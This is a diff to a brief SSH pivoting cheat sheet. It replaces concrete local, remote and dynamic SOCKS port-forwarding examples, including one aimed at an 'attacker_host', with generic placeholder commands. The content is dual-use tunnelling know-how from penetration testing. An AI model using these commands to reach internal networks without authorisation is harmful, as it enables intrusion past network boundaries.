@@ -1,16 +1,10 @@
 # SSH Pivoting
 
-## Local Port Forward
+## Local forward (access remote service from localhost)
+ssh -L 127.0.0.1:<LPORT>:<RHOST>:<RPORT> <USER>@<JUMP>
 
-ssh -L 8080:10.0.0.5:80 user@pivot_host
-Access internal host: http://127.0.0.1:8080
+## Dynamic SOCKS (proxy a whole subnet via SOCKS5)
+ssh -D 127.0.0.1:<SOCKS_PORT> <USER>@<JUMP>
 
-Remote Port Forward
-
-ssh -R 8080:127.0.0.1:80 user@attacker_host
-Attacker can access pivot’s internal service.
-
-Dynamic Port Forward (SOCKS)
-
-ssh -D 1080 user@pivot_host
-Set proxychains.conf to socks5 127.0.0.1 1080.
+## Remote forward (expose local service to remote)
+ssh -R <RPORT>:127.0.0.1:<LPORT> <USER>@<JUMP>
